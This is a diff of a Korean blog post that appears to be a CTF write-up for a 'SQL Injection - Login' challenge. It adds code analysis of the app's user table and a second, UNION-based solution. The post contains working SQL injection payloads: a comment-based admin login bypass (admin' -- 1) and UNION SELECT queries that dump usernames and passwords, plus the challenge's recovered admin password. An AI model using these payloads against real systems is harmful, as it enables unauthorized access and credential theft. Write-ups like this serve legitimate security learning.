@@ -27,11 +27,17 @@ published: true
 
 ### 목표
 
+---
+
 admin 계정으로 로그인하기
 
 |
 
+|
+
 ### 공격 기법
+
+---
 
 SQL Injection
 
@@ -116,6 +122,8 @@ if __name__ == "__main__":
 
 ### 메인 화면
 
+---
+
 ![1.1 SQL Injection - Login 4](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_4.png)
 
 ```python
@@ -141,6 +149,31 @@ SELECT * FROM user WHERE username = 'Usename 폼 입력값' AND password = 'Pass
 |
 
 ## 코드 분석
+
+### User()
+
+---
+
+```sql
+class User(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(80), unique=True, nullable=False)
+    password = db.Column(db.String(80), nullable=False)
+```
+
+user 테이블 생성
+
+열은 총 세 개로, 첫 번째 열은 `id`, 두 번째 열은 `username`, 세 번째 열은 `password`
+
+| id | username | password |
+|:---|:---------|:---------|
+|    |          |        |
+
+user 테이블은 이러한 형태가 됨
+
+|
+
+|
 
 ### login()
 
@@ -199,6 +232,16 @@ user = result.fetchone()
 
 `result`(쿼리 결과)에서 첫 번째 행을 가져와 `user` 변수에 저장
 
+쿼리가 정상적으로 실행된다면, `user` 변수는 **user 테이블의 행**을 나타냄
+
+즉,
+
+`user[0]` = **id 값**
+
+`user[1]` = **username 값**
+
+`user[2]` = **password 값**
+
 |
 
 ```python
@@ -206,7 +249,7 @@ if user and user[1] == "admin":
   return redirect(url_for("success", username=user[1], flag=LOGIN_FLAG)
 ```
 
-`user`가 존재하고 `user[1]`(user의 두 번째 필드)이 “admin”이면,
+`user`가 존재하고 `user[1]`이 **“admin”**이면,
 
 `success` 뷰로 리다이렉트 후 `username`을 `user[1]`로, `flag`를 `LOGIN_FLAG`로 설정
 
@@ -220,6 +263,8 @@ elif user:
 `user`가 존재할 경우
 
 `success` 뷰로 리다이렉트 후 `username` 을 `user[1]` 로 설정
+
+|
 
 |
 
@@ -239,7 +284,7 @@ return render_template("success.html", username=username, flag=flag)
 
 `success.html` 이 렌더링되면서 `username`과 `flag` 변수 전달
 
-즉, login()에서 admin으로 로그인에 성공하면 username과 flag가 화면에 나타나게 됨
+즉, **login()**에서 **"admin"**으로 로그인에 성공하면 `username`과 `flag`가 화면에 나타나게 됨
 
 |
 
@@ -248,6 +293,10 @@ return render_template("success.html", username=username, flag=flag)
 |
 
 ## 문제 풀이
+
+### 방법 1
+
+---
 
 ```sql
 SELECT * FROM user WHERE username = '{username}' AND password = '{password}'
@@ -259,7 +308,7 @@ SELECT * FROM user WHERE username = '{username}' AND password = '{password}'
 SELECT * FROM user WHERE username = 'admin' AND password = '{password}'
 ```
 
-username이 admin이 되어야함
+`username`이 **"admin"**이 되어야함
 
 |
 
@@ -267,7 +316,7 @@ username이 admin이 되어야함
 SELECT * FROM user WHERE username = 'admin' -- AND password = '{password}'
 ```
 
-username = admin인 것이 필요하므로 필요 없는 password는 주석 처리
+`username = 'admin'` 부분만 필요하므로 필요 없는 `password`는 주석 처리
 
 주의해야 할 점이, 주석 처리를 하기 위해서는 주석 뒤에 최소 한 개의 공백이 존재해야함
 
@@ -281,7 +330,74 @@ admin' -- 1
 
 뒤에 1을 쓰는 이유는 공백이 있음을 명확하게 하기 위해서임. 아닐 수도 있음ㅋ
 
-password는 주석처리 될 운명이기 때문에 아무거나 넣어도 됨 
+`password`는 주석처리 될 운명이기 때문에 아무거나 넣어도 됨 
+
+|
+
+|
+
+### 방법 2
+
+[1.2 SQL Injection DB](https://parkseunghan.github.io/web%20hacking/knock-on-challenges-1-2/) 참고
+
+**union**을 활용해서 `username`과 `password`를 직접 구할 수 있음
+
+user 테이블의 형태는 이미 알고 있으므로
+
+`username`과 `password`를 조회하여 직접 **"admin"** 계정의 `password`를 알아낼 수 있음
+
+|
+
+```sql
+' union select 1,(select username from user limit 0,1),3 -- 1
+```
+
+![1.1 SQL Injection - Login 6](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_6.png)
+
+user 테이블의 첫 번째 행의 `username`은 “guest”
+
+|
+
+```sql
+' union select 1,(select password from user limit 0,1),3 -- 1
+```
+
+![1.1 SQL Injection - Login 7](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_7.png)
+
+`password`는 “password”
+
+|
+
+```sql
+' union select 1,(select username from user limit 1,1),3 -- 1
+```
+
+![1.1 SQL Injection - Login 8](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_8.png)
+
+두 번째 행의 `username`은 **“admin”**
+
+|
+
+```sql
+' union select 1,(select password from user limit 1,1),3 -- 1
+```
+
+![1.1 SQL Injection - Login 9](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_9.png)
+
+`password`는 **“strong_admin_password_it_cant_be_leak”**
+
+|
+
+정리하면,
+
+| id | username | password |
+|:---|:---------|:---------|
+| 1 | guest | password |
+| 2 | admin | strong_admin_password_it_cant_be_leak |
+
+user 테이블의 구조는 위와 같은 형태임을 알 수 있음
+
+이를 활용해 직접 로그인이 가능함
 
 |
 
@@ -291,10 +407,22 @@ password는 주석처리 될 운명이기 때문에 아무거나 넣어도 됨
 
 ## Exploit
 
-```python
-username: "admin' -- 1"
+### 방법 1
 
-password: "1"
+```python
+username: admin' -- 1
+
+password: 1
+```
+
+|
+
+### 방법 2
+
+```js
+username: admin
+
+password: strong_admin_password_it_cant_be_leak
 ```
 
 |
